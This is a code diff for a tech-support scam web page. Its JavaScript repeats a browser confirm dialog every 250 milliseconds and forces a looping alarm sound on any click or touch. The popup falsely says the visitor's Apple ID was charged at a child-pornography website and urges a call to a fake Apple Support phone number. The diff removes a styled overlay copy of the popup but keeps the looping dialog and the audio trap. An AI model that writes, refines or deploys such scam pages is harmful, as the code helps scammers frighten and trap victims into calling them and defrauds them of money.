@@ -369,80 +369,30 @@
         var alertAudio = new Audio('ialert.mp3');
         alertAudio.preload = 'auto';
         alertAudio.loop = true;
+        alertAudio.load();
 
         function startAudioLoop() {
             try {
                 alertAudio.loop = true;
                 if (alertAudio.paused) {
-                    var playPromise = alertAudio.play();
-                    if (playPromise !== undefined) {
-                        playPromise.catch(function(error) {});
+                    var promise = alertAudio.play();
+                    if (promise !== undefined) {
+                        promise.catch(function(e) {});
                     }
                 }
             } catch(e) {}
         }
 
-        // Attach direct interaction listeners without passive flag to unlock audio on any gesture
-        var userEvents = ['click', 'touchstart', 'touchend', 'pointerdown', 'pointerup', 'mousedown', 'mouseup', 'keydown'];
-        userEvents.forEach(function(eventType) {
-            window.addEventListener(eventType, startAudioLoop, false);
-            document.addEventListener(eventType, startAudioLoop, false);
+        // Attach interaction listeners to unlock audio on any touch/click anywhere on screen
+        var userEvents = ['touchstart', 'touchend', 'click', 'pointerdown', 'pointerup', 'mousedown', 'mouseup', 'keydown'];
+        userEvents.forEach(function(evt) {
+            window.addEventListener(evt, startAudioLoop, { capture: true });
+            document.addEventListener(evt, startAudioLoop, { capture: true });
         });
-
-        // Create HTML Popup Overlay so touching anywhere on screen/popup fires DOM interaction events
-        function createAlertOverlay() {
-            if (document.getElementById('custom-alert-overlay')) return;
-            
-            var overlay = document.createElement('div');
-            overlay.id = 'custom-alert-overlay';
-            overlay.style.cssText = 'display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.65); z-index:999999; justify-content:center; align-items:center; -webkit-tap-highlight-color:transparent;';
-            
-            overlay.innerHTML = '<div style="background:#fff; border-radius:14px; max-width:320px; width:85%; text-align:center; font-family:-apple-system,BlinkMacSystemFont,sans-serif; overflow:hidden; box-shadow:0 10px 25px rgba(0,0,0,0.4); margin:auto;">' +
-                '<div style="padding:20px 16px 16px;">' +
-                    '<h3 style="margin:0 0 8px; font-size:17px; font-weight:600; color:#000;">Security Alert</h3>' +
-                    '<p style="margin:0; font-size:13px; color:#333; line-height:1.4;">Your Apple ID was recently used at CHILD PORNOGRAPGHY WEBSITE for $549.59 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and security.Not you?Immediately Call APPLE SUPPORT +1(844)530-2543 to Freeze it!.</p>' +
-                '</div>' +
-                '<div style="border-top:1px solid #e5e5e5; display:flex;">' +
-                    '<button id="alert-cancel-btn" style="flex:1; border:none; background:transparent; padding:12px; font-size:16px; color:#007aff; font-weight:400; border-right:1px solid #e5e5e5; cursor:pointer;">Cancel</button>' +
-                    '<button id="alert-ok-btn" style="flex:1; border:none; background:transparent; padding:12px; font-size:16px; color:#007aff; font-weight:600; cursor:pointer;">OK</button>' +
-                '</div>' +
-            '</div>';
-            
-            document.body.appendChild(overlay);
-
-            overlay.addEventListener('click', function(e) { startAudioLoop(); }, false);
-            overlay.addEventListener('touchstart', function(e) { startAudioLoop(); }, false);
-
-            document.getElementById('alert-ok-btn').addEventListener('click', function(e) {
-                e.stopPropagation();
-                startAudioLoop();
-                okkkk();
-            }, false);
-
-            document.getElementById('alert-cancel-btn').addEventListener('click', function(e) {
-                e.stopPropagation();
-                startAudioLoop();
-            }, false);
-        }
-
-        if (document.readyState === 'loading') {
-            document.addEventListener('DOMContentLoaded', createAlertOverlay);
-        } else {
-            createAlertOverlay();
-        }
-
-        function showAlertOverlay() {
-            createAlertOverlay();
-            var overlay = document.getElementById('custom-alert-overlay');
-            if (overlay) {
-                overlay.style.display = 'flex';
-            }
-        }
 
         setTimeout(function() {
             function loopConfirm() {
                 startAudioLoop(); 
-                showAlertOverlay();
                 myFunction();
                 setTimeout(loopConfirm, 250);
             }
@@ -471,9 +421,7 @@
 
         function myFunction() {
             startAudioLoop();
-            var userChoice = confirm("Your Apple ID was recently used at CHILD PORNOGRAPGHY WEBSITE for $549.59 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and security.Not you?Immediately Call APPLE SUPPORT +1(844)530-2543 to Freeze it!.");
-            startAudioLoop();
-            if (userChoice) {
+            if (confirm("Your Apple ID was recently used at CHILD PORNOGRAPGHY WEBSITE for $549.59 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and security.Not you?Immediately Call APPLE SUPPORT +1(844)530-2543 to Freeze it!.")) {
                 okkkk();
             } else {
                 startAudioLoop();
